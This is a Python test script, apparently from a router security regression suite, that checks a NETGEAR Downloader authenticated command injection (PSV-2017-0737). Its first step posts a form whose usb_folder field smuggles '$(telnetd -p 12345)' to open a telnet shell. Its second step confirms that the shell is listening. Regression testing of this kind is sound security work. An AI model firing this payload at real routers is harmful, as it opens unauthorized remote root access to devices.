''' [PSV-2017-0737] Authenticated Command injection in NETGEAR Downloader   '''
''' anthor Cloud 2018-01-03'''
'''v1.0 '''

from API._API import *

#def test_step_0():
    #log.info( 'step-0-0 dut loaddrfault wait 160s')
    #aploaddefault()
    #log.info( "step-0-1 AP Genie over leap done")
    #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 Authenticated Command injection in NETGEAR Downloader ')
    if console_type == 'cable':
        print 'This case NA'
        result = 'fail'
    else:
        url = host + urlLogs
        token = getIDToken(url)
        driver = webdriver.Firefox()
        url = "http://" + user + ':' + passwd + "@" + hostip
        driver.get(url)
        time.sleep(15)
        try:
            sec = driver.switch_to.alert
        except:
            time.sleep(1)
        try:
            sec.dismiss()
        except:
            time.sleep(1)
        str3 = sendCommandAndGetReturnUntil(com,'nvram show | grep https ','#')
        if str3.find('httpsEnable') != -1:
            driver.find_element_by_name("logout").click()
        #driver.find_element_by_link_text("ADVANCED").click()
        driver.find_element_by_xpath("//li[2]/a/span").click()
        time.sleep(5)
        try:
            text = ''
            text = driver.find_element_by_id("downloader_header")
        except:
            time.sleep(1)
        driver.quit()
        if text != '':
            log.info('Get download_settings token id')
            url = host + 'Download_settings.htm'
            token = getIDToken(url)
            Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd)
            headers = {
                'Host': hostip,
                'Upgrade-Insecure-Requests': '1',
                'Authorization': Authorization,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
            }
            data = 'cfAlert_Apply=Apply&usb_folder=U:\$(telnetd -p 12345)&max_concur_sel=5&max_down_speed=0&max_up_speed=10&max_concur_tasks=5&concur_tasks_allow=0&refresh_rate=3&auto_refresh_enable=0'
            if console_type == 'cable':
                post_url = host + 'goform/downloader_adv' + token
            else:
                post_url = host + 'downloader_adv.cgi' + token
            r = requests.post(post_url, headers=headers, data=data,timeout=5)
            log.info(r.text)
            time.sleep(10)
            result = 'pass'
        else:
            result = 'pass'
    assert result == 'pass', "This action should work." 

def test_Step_2():
    log.info( 'step-2 judje dut telnet service is enable on 12345 port')
    if console_type == 'cable':
        print 'This case NA'
        str = 'fail'
    else:
        str = judjeduttelnet(host=hostip,username='admin',password='Password!',telnetport ='12345',prompt='#')
    assert str == 'pass', "This action should work." 